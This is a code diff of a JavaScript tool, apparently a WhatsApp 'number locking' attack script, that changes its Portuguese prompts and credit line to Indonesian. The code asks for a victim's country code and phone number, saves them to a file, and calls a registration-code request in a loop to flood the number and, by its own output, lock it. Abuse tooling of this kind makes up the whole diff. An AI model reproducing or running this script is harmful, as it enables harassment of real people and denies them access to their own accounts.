@@ -25,7 +25,7 @@ const start = async () => {
       try {
       //console.log(gradient('red', 'red')('💀■■■■■■■💀 +' + ddi + number))
       console.clear();
-      console.log(gradient('red', 'blue')('💀Number Locking by @ransomxrend3ro💀 +' + ddi + number))
+      console.log(gradient('red', 'blue')('💀Nomor telah terkunci by @rot@sirot💀 +' + ddi + number))
         res = await spam.requestRegistrationCode({
           phoneNumber: '+' + phoneNumber,
           phoneNumberCountryCode: ddi,
@@ -50,8 +50,8 @@ const start = async () => {
   console.log(gradient('black', 'black')('■'))
   console.log(gradient('black', 'black')('■'))
   console.log(gradient('black', 'black')('■'))
-  let ddi = prompt(gradient('purple', 'cyan')('[+] Digite o ddi do alvo: '));
-  let number = prompt(gradient('purple', 'cyan')('[+] Digite o número do alvo: '))
+  let ddi = prompt(gradient('purple', 'cyan')('[+] masukkan code negara (91) tidak menggunakan(+): '));
+  let number = prompt(gradient('purple', 'cyan')('[+] masukkan nomor telepon korban(895252141) tidak menggunakan(62): '))
   let phoneNumber = ddi + number;
   numbers[phoneNumber] = { ddi, number }
   fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));
